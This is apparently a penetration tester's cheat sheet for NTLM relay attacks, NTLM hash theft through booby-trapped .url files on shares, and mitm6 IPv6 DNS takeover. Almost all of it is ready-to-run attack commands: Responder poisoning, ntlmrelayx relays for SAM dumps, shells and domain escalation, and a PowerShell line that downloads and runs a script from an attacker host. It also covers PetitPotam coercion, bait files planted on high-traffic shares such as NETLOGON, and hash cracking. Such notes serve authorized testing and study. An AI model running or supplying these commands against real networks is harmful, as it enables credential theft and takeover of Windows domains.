---
tags:
  - Foundational
  - Lateral_Movement
  - NTLM
  - NTLM_Relay
  - SMB
  - Windows
---

## NTLM Relay Attack
resources: [HackTricks NTLM Relay](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ntlm-relay), [Impacket ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)

> [!info] Capture NTLM authentication and relay it to another service. Works when SMB signing is disabled/not required. Can gain code execution or dump credentials.

> [!important] **Requirements:**
> - SMB signing disabled or not required on target
> - Ability to intercept/coerce authentication (ARP spoofing, LLMNR/NBT-NS poisoning, **PetitPotam**)
> - Target machine different from source of authentication

### Check SMB Signing [Local]
```bash
nxc smb <TargetIP> --gen-relay-list relay_targets.txt
```

```bash
nxc smb <TargetCIDR> --gen-relay-list relay_targets.txt
```

### Check with Nmap [alternative]
```bash
nmap -p445 --script smb2-security-mode <TargetIP>
```

### Start Responder (Capture Mode) [Local]
> [!warning] Disable SMB and HTTP in **Responder** to let **ntlmrelayx** handle them.

```bash
sudo sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf
sudo sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
```

```bash
sudo responder -I <Interface> -dwv
```

### Start ntlmrelayx [Local]
```bash
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
```

### Relay to Dump SAM [Local]
```bash
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
```

### Relay for Interactive Shell [Local]
```bash
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i
```

> [!tip] Connect to shell with: `nc 127.0.0.1 11000`

### Relay to Execute Command [Local]
```bash
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "whoami"
```

```bash
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/shell.ps1')"
```

### Relay to LDAP for ACL Abuse [Local]
```bash
impacket-ntlmrelayx -t ldaps://<DC_IP> --escalate-user <Username>
```

### Relay to ADCS (ESC8) [Local]
> [!tip] If AD Certificate Services web enrollment is enabled.

```bash
impacket-ntlmrelayx -t http://<CA_IP>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

### Coerce Authentication with PetitPotam [Local]
> [!info] Force target to authenticate to your relay server.

```bash
PetitPotam.py <KaliIP> <TargetIP>
```

### Coerce with PrinterBug [alternative]
```bash
printerbug.py <Domain>/<Username>:<Password>@<TargetIP> <KaliIP>
```

### Validate Relayed Access [Local]
```bash
nxc smb <TargetIP> -u <RelayedUser> -H '<NTLMHash>'
```

## NTLM Capture via File Shares
resources: [ntlm_theft](https://github.com/Greenwolf/ntlm_theft), [HackTricks NTLM Theft](https://book.hacktricks.xyz/windows/ntlm/places-to-steal-ntlm-creds)

> [!info] Drop malicious files on writable shares. When users browse to the folder, their system auto-authenticates to your capture server.

### File Types for Share Drops
> **Best choice:** `.url` files work on modern Windows
> `.url` (URL field) - Browse to folder - Works on modern Windows
> `.url` (ICONFILE) - Browse to folder - Works on modern Windows
> `.lnk` - Browse to folder - Works on modern Windows
> `.scf` - Browse to folder - Patched
> `desktop.ini` - Browse to folder - Patched

### Setup ntlm_theft [Local]
```bash
cd /opt/ && git clone https://github.com/Greenwolf/ntlm_theft
```

```bash
cd ntlm_theft && python3 -m venv ntlm_theft_venv && source ntlm_theft_venv/bin/activate
```

```bash
pip3 install xlsxwriter
```

### Generate Malicious Files [Local]
> [!tip] Start Responder or ntlmrelayx first to capture the auth.

```bash
responder -I <Interface>
```

```bash
python3 ntlm_theft.py -g modern -s <AttackerIP> -f payroll
```

```bash
python3 ntlm_theft.py -g url -s <AttackerIP> -f payroll
```

### Upload to Writable Share [Local]
```bash
smbclient //<TargetIP>/<Share> -U <User>%<Pass> -c "put payroll/payroll-(icon).url"
```

```bash
smbclient //<TargetIP>/<Share> -U <User>%<Pass> -c "put payroll/@payroll.url"
```

### Manual .url File [alternative]
```ini
[InternetShortcut]
URL=file://<AttackerIP>/share
```

```ini
[InternetShortcut]
URL=https://google.com
IconIndex=0
IconFile=\\<AttackerIP>\share\icon.ico
```

### High-Value Share Targets
> **NETLOGON** - All domain users access during logon
> **SYSVOL** - GPO-related, frequently accessed
> **Department shares** - HR, Finance, IT - active users
> **Project folders** - Targeted teams
> **Public/Common** - High traffic

### Crack Captured NetNTLMv2 [Local]
```bash
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

```bash
hashcat -O -m 5600 -a 0 -r /usr/share/hashcat/rules/best64.rule hashes.txt /usr/share/wordlists/rockyou.txt
```

### Crack NetNTLMv1 [alternative]
```bash
hashcat -m 5500 hashes.txt /usr/share/wordlists/rockyou.txt
```

## IPv6 DNS Takeover
resources: [mitm6 Blog](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)

> [!info] Abuse IPv6 DNS to redirect WPAD/auth requests. Effective in dual-stack networks.

### mitm6 with NTLM Relay [Local]
```bash
mitm6 -d <Domain>
```

```bash
impacket-ntlmrelayx -6 -wh <AttackerIP> -t ldaps://<DC_IP> -l loot --delegate-access
```
